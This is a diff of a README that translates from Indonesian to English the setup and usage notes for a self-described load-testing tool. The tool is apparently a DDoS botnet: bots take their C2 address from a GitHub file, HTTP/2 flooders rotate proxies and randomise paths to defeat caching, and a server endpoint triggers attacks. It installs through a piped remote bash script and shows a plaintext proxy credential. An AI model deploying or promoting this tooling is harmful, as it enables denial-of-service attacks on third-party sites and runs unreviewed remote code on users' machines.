@@ -15,13 +15,13 @@ Distributed load testing tool with C2 server, HTTP/1 (`tls-raw`) and HTTP/2 + pr
 
 ## Setup
 
-### One-liner install (semua sekaligus)
+### One-liner install (all at once)
 
 ```bash
 bash <(curl -fsSL https://raw.githubusercontent.com/malasahjagotwin/restissue/refs/heads/master/setup.sh)
 ```
 
-Perintah di atas akan otomatis download `bot`, `up`, `tls-fler`, dan `proxy/global.txt` lalu set permission.
+This will automatically download `bot`, `up`, `tls-fler`, and `proxy/global.txt` then set the correct permissions.
 
 ---
 
@@ -41,7 +41,7 @@ wget https://github.com/malasahjagotwin/restissue/raw/refs/heads/master/bin/tls-
 mkdir -p proxy && wget https://raw.githubusercontent.com/malasahjagotwin/restissue/refs/heads/master/proxy/global.txt -O proxy/global.txt
 ```
 
-> `tls-fler` akan otomatis cek & update `proxy/global.txt` dari GitHub setiap 30 detik jika ada perubahan.
+> `tls-fler` automatically checks & updates `proxy/global.txt` from GitHub every 30 seconds if there are any changes.
 
 ---
 
@@ -49,13 +49,13 @@ mkdir -p proxy && wget https://raw.githubusercontent.com/malasahjagotwin/restiss
 
 ### Bot (C2 client)
 
-Bot tidak perlu flag. IP:port server diambil otomatis dari GitHub (`server/addr.txt`) dan auto-reconnect jika berubah.
+No flags required. The server IP:port is fetched automatically from GitHub (`server/addr.txt`) and the bot will auto-reconnect whenever it changes.
 
 ```bash
 ./bot
 ```
 
-Bot akan polling `server/addr.txt` setiap 15 detik. Jika addr berubah, bot otomatis disconnect dan reconnect ke server baru.
+The bot polls `server/addr.txt` every 15 seconds. If the address changes, it disconnects and reconnects to the new server automatically.
 
 ---
 
@@ -66,39 +66,45 @@ Bot akan polling `server/addr.txt` setiap 15 detik. Jika addr berubah, bot otoma
 ```
 
 ```bash
-# Contoh
+# Example
 ./up https://example.com 60 50000
 ```
 
 ---
 
-### tls-fler (HTTP/2 + proxy rotasi)
+### tls-fler (HTTP/2 + proxy rotation)
 
 ```bash
 ./tls-fler <host> <duration_seconds> <rate>
 ```
 
 ```bash
-# Contoh
+# Example
 ./tls-fler https://example.com 60 50000
+```
+
+Supports `%RAND%` placeholder in the URL path — replaced with a random string on every request:
+
+```bash
+./tls-fler https://example.com/%RAND% 60 50000
 ```
 
 ---
 
 ## C2 Server
 
-### Jalankan server
+### Start the server
 
 ```bash
 ./server -p <port>
 ```
 
 ```bash
-# Contoh
+# Example
 ./server -p 8080
 ```
 
-### Trigger attack via /fetch
+### Trigger via /fetch
 
 ```bash
 curl "http://<server_ip>:<port>/fetch?host=https://example.com&duration=60&method=tls-raw"
@@ -119,16 +125,18 @@ Response:
 
 ## Update Proxy
 
-Edit `proxy/global.txt` di GitHub dan commit. `tls-fler` yang sedang berjalan akan otomatis mendeteksi perubahan dan memperbarui daftar proxy dalam 30 detik.
+Edit `proxy/global.txt` on GitHub and commit. Any running `tls-fler` instance will detect the change and update its proxy list within 30 seconds.
 
-Format proxy (`ip:port:user:pass`):
+Proxy format (`ip:port:user:pass`):
 ```
 31.59.20.176:6754:znepvsaz:nxvdfiogh158
 ```
 
+---
+
 ## Update Server Address
 
-Edit `server/addr.txt` di GitHub dan commit. Semua bot yang sedang berjalan akan otomatis reconnect ke server baru dalam 15 detik.
+Edit `server/addr.txt` on GitHub and commit. All running bots will automatically reconnect to the new server within 15 seconds.
 
 Format (`ip:port`):
 ```
